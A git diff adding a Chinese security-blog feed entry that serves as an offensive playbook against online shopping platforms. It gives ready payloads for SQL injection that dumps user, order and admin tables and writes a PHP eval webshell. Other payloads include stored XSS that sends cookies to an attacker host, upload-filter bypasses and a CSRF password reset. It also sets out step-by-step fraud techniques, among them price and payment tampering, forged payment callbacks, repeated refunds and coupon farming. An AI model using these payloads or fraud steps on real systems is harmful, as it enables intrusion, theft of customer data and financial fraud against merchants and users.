@@ -3,12 +3,303 @@
     <title>Demolish的网安笔记</title>
     <link href="https://Fuzzy-World.github.io/feed.xml" rel="self" />
     <link href="https://Fuzzy-World.github.io" />
-    <updated>2026-03-31T00:58:19+08:00</updated>
+    <updated>2026-04-09T21:46:44+08:00</updated>
     <author>
         <name>Demolish</name>
     </author>
     <id>https://Fuzzy-World.github.io</id>
 
+    <entry>
+        <title>商城业务系统</title>
+        <author>
+            <name>Demolish</name>
+        </author>
+        <link href="https://Fuzzy-World.github.io/shang-cheng-ye-wu-xi-tong-lou-dong.html"/>
+        <id>https://Fuzzy-World.github.io/shang-cheng-ye-wu-xi-tong-lou-dong.html</id>
+
+        <updated>2026-04-09T21:46:14+08:00</updated>
+            <summary type="html">
+                <![CDATA[
+                    <p> </p>
+
+                ]]>
+            </summary>
+        <content type="html">
+            <![CDATA[
+                <p> </p>
+
+<p><strong>一、通用 Web 漏洞 商城定向利用（入口打点）</strong></p>
+<ol>
+<li><strong> SQL 注入漏洞 实战利用</strong></li>
+</ol>
+<p><strong>高频注入点</strong></p>
+<p>商品搜索 / 筛选、商品 ID、分类 ID、订单号、优惠券 ID、收货地址 ID、售后单号、用户中心查询参数</p>
+<p><strong>利用步骤 &amp; Payload</strong></p>
+<ol>
+<li>基础注入探测</li>
+</ol>
+<ul>
+<li>普通参数闭合：?goods_id=1' and 1=1--+/ ?goods_id=1' and 1=2--+</li>
+<li>搜索框模糊查询闭合：search=手机%' and 1=1--+</li>
+<li>字段数猜解：?order_id=1001 order by 5--+逐步递增数字确定字段数</li>
+</ul>
+<ol start="2">
+<li>商城核心数据脱库（MySQL）</li>
+</ol>
+<ul>
+<li>脱用户账号密码表：?goods_id=-1 union select 1,username,password,phone,id_card from user--+</li>
+<li>脱订单交易表：?goods_id=-1 union select 1,order_no,user_id,pay_money,pay_status,address from order_info--+</li>
+<li>脱管理员账号表：?goods_id=-1 union select 1,admin_user,admin_pass,role from admin--+</li>
+</ul>
+<ol start="3">
+<li>高阶恶意利用</li>
+</ol>
+<ul>
+<li>堆叠注入改价：?goods_id=1;update goods set price=0.01 where id=1;--</li>
+<li>堆叠注入改订单状态：?goods_id=1;update order_info set pay_status=1 where order_no='xxx';--</li>
+<li>写 WebShell（有权限场景）：?goods_id=-1 union select 1,"&lt;?php @eval($_POST['cmd']);?&gt;" into outfile "/var/www/html/mall/shell.php"--+</li>
+</ul>
+<ol start="4">
+<li>WAF 绕过技巧</li>
+</ol>
+<ul>
+<li>空格替换为/**/、%0a、%0b；双写关键字绕过；大小写混合绕过；URL 全编码绕过</li>
+</ul>
+<ol start="2">
+<li><strong> XSS 漏洞 实战利用</strong></li>
+</ol>
+<p><strong>高频触发点</strong></p>
+<p>商品评论、用户昵称、收货地址、订单留言、售后备注、商品咨询、个人签名、搜索结果页</p>
+<p><strong>利用步骤 &amp; Payload</strong></p>
+<ol>
+<li>存储型 XSS（最高危，会话劫持）</li>
+</ol>
+<ul>
+<li>基础 Cookie 窃取：&lt;script&gt;document.location='http://your-vps.com/cookie?c='+document.cookie&lt;/script&gt;</li>
+<li>标签过滤绕过：&lt;img src=x onerror="document.location='http://your-vps.com/cookie?c='+document.cookie"&gt;</li>
+<li>高阶利用：植入 JS 脚本，自动执行修改用户收货地址、发起退款、领取优惠券、下单支付等操作，实现账户盗刷</li>
+<li>利用流程：提交 Payload→等待管理员 / 用户访问触发→窃取 Cookie→替换浏览器 Cookie→直接登录目标账号</li>
+</ul>
+<ol start="2">
+<li>反射型 XSS</li>
+</ol>
+<ul>
+<li>利用流程：构造恶意链接http://mall.com/search?keyword=&lt;script&gt;窃取Cookie脚本&lt;/script&gt;→诱导已登录用户点击→触发漏洞→劫持用户会话</li>
+</ul>
+<ol start="3">
+<li><strong> 越权访问漏洞 实战利用</strong></li>
+</ol>
+<p><strong>水平越权（最常见，批量拖数据）</strong></p>
+<ol>
+<li>高频点：订单详情、收货地址、个人信息、售后详情、充值记录、优惠券列表</li>
+<li>利用步骤</li>
+<li>登录自身账号，抓包正常业务请求，示例：GET /api/order/detail?order_id=10001</li>
+<li>遍历修改order_id/user_id/address_id/after_sale_id参数，比如改为 10002、10003</li>
+<li>重放请求，查看是否返回他人的敏感数据，实现批量遍历脱库</li>
+<li>高阶利用：POST 请求修改他人订单收货地址、取消他人订单、为他人订单申请退款</li>
+<li>绕过技巧：同步修改 Cookie 中的user_id和请求参数的user_id，保持一致绕过归属校验</li>
+</ol>
+<p><strong>垂直越权（提权拿后台）</strong></p>
+<ol>
+<li>高频点：管理员后台接口、商品管理、订单管理、用户管理、优惠券发放接口</li>
+<li>利用步骤</li>
+<li>普通用户登录，抓包获取前端泄露的管理员接口路径，比如/api/admin/goods/add、/admin/user/list</li>
+<li>直接请求该接口，查看是否能未授权访问；或遍历/admin/路径下的接口，获取后台功能入口</li>
+<li>绕过技巧：添加X-Forwarded-For:127.0.0.1、Referer:http://mall.com/admin头，绕过来源 IP 和 Referer 校验</li>
+<li>高阶利用：调用优惠券发放接口，为自身账号发放无限大额优惠券；修改商品价格 / 库存；封禁 / 修改管理员账号</li>
+</ol>
+<p><strong>未授权访问（无门槛打点）</strong></p>
+<ol>
+<li>高频点：订单导出、用户列表、日志下载、优惠券批量生成、统计报表、swagger 接口文档</li>
+<li>利用步骤</li>
+<li>直接浏览器访问/api/order/export、/api/user/list、/swagger-ui.html，无需登录，查看是否返回核心数据</li>
+<li>正常请求抓包，去掉 Cookie 和 Token 头，重放请求，查看是否正常响应</li>
+<li>高阶利用：通过未授权 swagger 文档获取全量接口，批量探测未授权高危接口；未授权访问 redis 管理界面，写入 WebShell</li>
+<li><strong> 文件上传漏洞 实战利用</strong></li>
+</ol>
+<p><strong>高频上传点</strong></p>
+<p>商品图片上传、用户头像上传、商家资质上传、售后凭证上传、评论图片上传</p>
+<p><strong>利用步骤 &amp; 绕过技巧</strong></p>
+<ol>
+<li>基础利用：直接上传 php 一句话木马，后缀使用php、php5、phtml、php3</li>
+<li>后缀绕过</li>
+</ol>
+<ul>
+<li>双后缀绕过：php.jpg、shell.jpg.php</li>
+<li>大小写绕过：PHP、shell.PhP</li>
+<li>特殊字符绕过：php.、shell.php%00.jpg、shell.php::$DATA（Windows 环境）</li>
+</ul>
+<ol start="3">
+<li>内容绕过：文件头添加GIF89a，木马内容写在后面，绕过文件内容校验</li>
+<li>条件竞争利用：Burp 并发上传 + 并发访问临时文件，在服务器删除临时文件前触发木马执行</li>
+<li>高阶利用：上传.htaccess文件，设置 jpg 文件解析为 php，再上传图片马；上传 webshell 后提权，接管整个商城服务器</li>
+<li><strong> CSRF 漏洞 实战利用</strong></li>
+</ol>
+<p><strong>高频触发点</strong></p>
+<p>修改收货地址、修改登录密码、取消订单、确认收货、绑定银行卡、邀请返利</p>
+<p><strong>利用步骤</strong></p>
+<ol>
+<li>抓包正常业务 POST 请求，示例：POST /api/user/address/edit，参数address=xxx&amp;phone=xxx</li>
+<li>构造 CSRF 自动提交页面，诱导已登录的用户访问</li>
+<li>触发后自动修改用户收货地址为攻击者地址，后续用户下单商品直接寄到攻击者地址</li>
+<li>GET 型 CSRF 一键触发：&lt;img src="http://mall.com/api/user/password/reset?new_pass=123456"&gt;，用户访问页面即触发密码重置</li>
+</ol>
+<p><strong>二、商城专属业务逻辑漏洞 核心利用（绕 WAF，直接触达资金 / 数据，渗透重点）</strong></p>
+<ol>
+<li><strong> 账号与认证模块 漏洞利用</strong></li>
+</ol>
+<p><strong>任意用户密码重置 全场景利用</strong></p>
+<ol>
+<li>验证码响应包回显利用</li>
+</ol>
+<ul>
+<li>流程：进入忘记密码页→输入目标手机号→点击获取验证码→抓包查看响应包→提取响应中明文返回的验证码→用该验证码重置目标用户密码</li>
+</ul>
+<ol start="2">
+<li>验证码无限制暴力破解</li>
+</ol>
+<ul>
+<li>流程：输入目标手机号获取一次验证码→抓包重置密码接口→对verify_code参数进行 4-6 位数字爆破→跑出正确验证码→重置目标密码</li>
+<li>绕过：添加X-Forwarded-For头，每次请求更换 IP，绕过 IP 频率限制</li>
+</ul>
+<ol start="3">
+<li>重置环节用户 ID 可控利用</li>
+</ol>
+<ul>
+<li>流程：自身账号正常走密码重置流程→到最后一步设置新密码时抓包→修改请求中user_id/phone/uid参数为目标用户信息→提交请求，直接重置目标用户密码，无需验证码</li>
+</ul>
+<ol start="4">
+<li>Session 覆盖利用</li>
+</ol>
+<ul>
+<li>流程：获取自身手机号的验证码，生成有效 session→抓包重置请求，将 session 绑定的手机号替换为目标手机号→用自身的验证码重置目标账号密码</li>
+</ul>
+<p><strong>账号暴力破解 / 撞库利用</strong></p>
+<ol>
+<li>流程：抓包登录接口→判断是否有验证码 / 频率限制→无限制则直接对password参数爆破，或用社工库撞库</li>
+<li>前置优化：通过账号错误和密码错误的不同回显，先批量枚举存在的账号，再定向爆破</li>
+<li>绕过：前端生成的验证码，直接从响应包提取自动填充，实现无限爆破</li>
+<li><strong> 商品与库存模块 漏洞利用</strong></li>
+</ol>
+<p><strong>商品价格篡改 0 元购 核心利用</strong></p>
+<ol>
+<li>前端传参改价利用</li>
+</ol>
+<ul>
+<li>流程：商品加入购物车→点击结算抓包下单接口→找到price/goods_price/total_money参数→修改为 01/0→提交请求，生成低价订单并完成支付</li>
+</ul>
+<ol start="2">
+<li>SKU 参数篡改利用</li>
+</ol>
+<ul>
+<li>流程：选择高价商品 SKU 加入购物车→抓包修改sku_id为同商品低价 SKU / 其他低价商品的 sku_id→提交订单，用低价购买高价商品</li>
+</ul>
+<ol start="3">
+<li>数量负值利用</li>
+</ol>
+<ul>
+<li>流程：商品加入购物车抓包→修改number/count参数为负数→订单总金额 = 单价 * 负数，直接变为负值→提交后账户余额异常增加，实现无成本充值</li>
+</ul>
+<ol start="4">
+<li>运费篡改利用</li>
+</ol>
+<ul>
+<li>流程：结算抓包→找到freight/shipping_fee参数→修改为 0 / 负数，抵扣订单金额→绕过满额免运费规则，低价订单 0 运费下单</li>
+</ul>
+<p><strong>库存超卖 / 无限下单利用</strong></p>
+<ol>
+<li>流程：抓包秒杀 / 限购商品的下单接口→Burp Intruder 设置 null payloads，并发线程 10-100→同时发送下单请求</li>
+<li>效果：后端无原子性库存扣减、无分布式锁，会生成多笔有效订单，远超库存限制，实现限购商品无限购买</li>
+<li>高阶：秒杀商品提前抓包，设置定时任务，零点并发请求，绕过前端秒杀时间限制</li>
+<li><strong> 订单交易模块 漏洞利用</strong></li>
+</ol>
+<p><strong>订单状态篡改 未支付变已支付利用</strong></p>
+<ol>
+<li>流程：生成未支付订单→抓包查看订单详情接口的order_status参数→找到订单状态修改 / 支付回调接口→修改order_status从 0（未支付）改为 1（已支付）/2（已完成）→提交请求，后端无校验直接修改订单状态，无需支付即可触发商家发货</li>
+<li>高阶：抓包商家后台发货接口，越权调用，直接将自身未支付订单标记为已发货、已完成</li>
+</ol>
+<p><strong>订单重复提交 重复薅权益利用</strong></p>
+<ol>
+<li>流程：新人首单 / 下单送优惠券 / 积分的订单，抓包下单接口→Burp 设置并发请求，同时发送多次→后端无幂等性控制，生成多笔有效订单，仅扣减一次库存，多次获取新人权益、优惠券、返利</li>
+<li>高阶：下单后取消订单，后端不回收优惠券 / 积分，循环下单 - 取消，无限刷取优惠券</li>
+<li><strong> 支付结算模块 最高危漏洞利用</strong></li>
+</ol>
+<p><strong>支付金额篡改 低价支付大额订单利用</strong></p>
+<ol>
+<li>核心场景利用</li>
+</ol>
+<ul>
+<li>流程：正常下单生成订单→跳转到支付页面抓包支付接口→找到pay_money/total_fee/amount参数→修改为 01→提交支付请求，后端仅校验支付是否成功，不校验金额与订单是否匹配，实现 0.01 元支付大额订单</li>
+</ul>
+<ol start="2">
+<li>负值支付充值利用</li>
+</ol>
+<ul>
+<li>流程：支付接口抓包→修改支付金额为负数（如 - 10000）→提交请求，后端无负数校验→支付成功后，账户余额增加 10000 元</li>
+</ul>
+<ol start="3">
+<li>绕过技巧：修改支付币种（CNY 改 USD）利用汇率差低价支付；修改支付数量参数 1 为 01，总金额缩减为原金额的 1%</li>
+</ol>
+<p><strong>支付回调伪造 虚假支付利用</strong></p>
+<ol>
+<li>核心利用流程</li>
+<li>正常小额下单，走完整支付流程，抓包第三方支付回调接口，示例：/api/pay/notify</li>
+<li>提取回调请求的核心参数：order_no、pay_status、pay_money、sign、trade_no</li>
+<li>构造伪造回调请求，修改order_no为自身未支付的大额订单号，pay_status改为 success，pay_money匹配订单金额</li>
+<li>重放请求，后端无签名校验、无 IP 白名单、无订单状态二次校验，直接将订单标记为已支付，实现 0 成本虚假支付</li>
+<li>高阶绕过</li>
+</ol>
+<ul>
+<li>小额支付获取正确签名格式，构造大额订单的有效签名，绕过签名校验</li>
+<li>添加X-Forwarded-For:第三方支付官方IP，绕过来源 IP 白名单限制</li>
+<li>伪造支付流水号，实现重复回调，多笔订单批量虚假支付</li>
+</ul>
+<p><strong>重复退款 / 超额退款利用</strong></p>
+<ol>
+<li>重复退款：已支付订单申请退款，抓包退款接口→并发发送多次请求→后端无幂等性控制，一笔订单多次退款</li>
+<li>超额退款：抓包退款接口→修改refund_money参数，大于订单实付金额→后端无金额上限校验，实现超额退款</li>
+<li>高阶利用：退款后不取消订单，商家继续发货，实现钱货两得；部分退款后再次申请全额退款，二次薅取资金</li>
+<li><strong> 营销活动模块 薅羊毛核心利用</strong></li>
+</ol>
+<p><strong>优惠券漏洞全场景利用</strong></p>
+<ol>
+<li>无限刷取优惠券</li>
+</ol>
+<ul>
+<li>流程：抓包优惠券领取接口/api/coupon/receive?coupon_id=1001→无领取次数限制则 Burp 循环发送请求，无限刷取</li>
+<li>绕过：更换账号 / 设备指纹 / IP，绕过单用户领取限制；修改请求中的时间参数，绕过活动起止时间限制</li>
+</ul>
+<ol start="2">
+<li>优惠券规则绕过</li>
+</ol>
+<ul>
+<li>满减门槛绕过：结算抓包→先修改订单金额满足满减门槛，使用优惠券后，再改回实际金额，实现低额订单用大额满减券</li>
+<li>使用范围绕过：单商品专用券，修改goods_id参数，实现全商品通用；修改叠加规则参数，实现多张优惠券叠加使用</li>
+</ul>
+<ol start="3">
+<li>优惠券 ID 遍历</li>
+</ol>
+<ul>
+<li>流程：抓包优惠券绑定接口→遍历coupon_id参数→获取平台未公开的内部大额优惠券，绑定到自身账号</li>
+</ul>
+<p><strong>秒杀 / 拼团漏洞利用</strong></p>
+<ol>
+<li>秒杀接口提前泄露利用：活动开始前 F12 查看前端代码，提取秒杀接口路径和参数→提前构造请求，活动开始前发送，提前抢购秒杀商品</li>
+<li>拼团逻辑绕过：拼团下单抓包→修改拼团价格参数，用 1 折价购买；修改拼团人数参数，1 人即可成团，无需邀请好友</li>
+</ol>
+<p><strong>积分 / 返利漏洞利用</strong></p>
+<ol>
+<li>签到积分重复领取：抓包签到接口→并发发送请求，无幂等性控制即可重复领取积分</li>
+<li>邀请返利刷取：抓包邀请注册接口→用接码平台批量注册小号，自己邀请自己，无限刷取邀请返利</li>
+<li>积分循环刷取：下单消费获得积分→取消订单，后端不回收积分→循环操作，无限刷取积分兑换商品</li>
+<li><strong> 售后履约模块 漏洞利用</strong></li>
+<li>售后时效 / 状态绕过：未收到货、超售后时效的订单，抓包售后申请接口→修改order_id/after_sale_type参数，强制申请退款 / 退货</li>
+<li>退货单号复用：多个售后订单使用同一个退货单号，批量薅取运费险；申请退款后，商家未校验退货状态直接退款，实现不退货也能拿钱</li>
+<li>商家端越权：商家账号登录→抓包商品 / 订单 / 财务接口→修改shop_id参数，越权查看 / 修改其他商家的商品、订单、财务数据，甚至平台全量用户数据</li>
+</ol>
+            ]]>
+        </content>
+    </entry>
     <entry>
         <title>实验教学平台Js审计，弱口令</title>
         <author>
